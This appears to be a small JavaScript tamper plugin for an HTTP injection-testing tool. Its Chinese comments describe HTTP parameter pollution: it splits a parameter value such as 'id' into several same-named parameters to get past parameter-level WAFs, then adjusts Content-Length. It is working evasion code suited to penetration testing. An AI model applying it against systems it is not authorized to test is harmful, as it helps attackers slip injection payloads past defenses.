//@name: HPP参数污染(示例)
//@usage: request
//@enable: false
// 报文级：HPP参数污染（参数值按空格拆成多个同名参数，绕过参数级WAF）
// PARAM 改为你的注入参数名；留空 '' 则拆分所有参数
var PARAM = 'id';
// 拆分一段参数串（query 或 body）：值允许含原始空格（本工具报文可不编码），遇 & 或串尾即止
function hpp(text, firstPre){
    return text.replace(new RegExp('([?&]|' + firstPre + ')([^&=\\s]+)=([^&\\r\\n]*)', 'gm'), function(m, pre, name, val){
        if (PARAM && name !== PARAM) { return m; }
        var parts = val.split(/%20|\+| /).filter(function(x){ return x.length > 0; });
        if (parts.length < 2) { return m; }
        // 首段保留原前缀（?/&/串首），后续段一律用 & 连接（重复 pre 会产生非法报文）
        return parts.map(function(p, i){ return (i === 0 ? pre : '&') + name + '=' + p; }).join('');
    });
}
function tamper(request){
    var headEnd = request.indexOf('\r\n\r\n');
    var head = headEnd < 0 ? request : request.substring(0, headEnd);
    var body = headEnd < 0 ? null : request.substring(headEnd + 4);
    // 请求行只处理 URL 部分：' HTTP/' 之后是协议版本号，
    // 吞进参数值拆分会把 HTTP/1.1 拼成参数、与 URL 挤在一起丢失空格
    var nl = head.indexOf('\r\n');
    var line1 = nl < 0 ? head : head.substring(0, nl);
    var headers = nl < 0 ? '' : head.substring(nl);
    var sp = line1.lastIndexOf(' HTTP/');
    var urlPart = sp < 0 ? line1 : line1.substring(0, sp);
    var verPart = sp < 0 ? '' : line1.substring(sp);
    var outHead = hpp(urlPart, '\\?') + verPart + headers;
    if (body === null) { return outHead; }
    var outBody = hpp(body, '^');
    // body变长后收敛Content-Length
    var blen = unescape(encodeURIComponent(outBody)).length;
    if (/^Content-Length:/im.test(outHead)) {
        outHead = outHead.replace(/^Content-Length:[^\r\n]*/im, 'Content-Length: ' + blen);
    }
    return outHead + '\r\n\r\n' + outBody;
}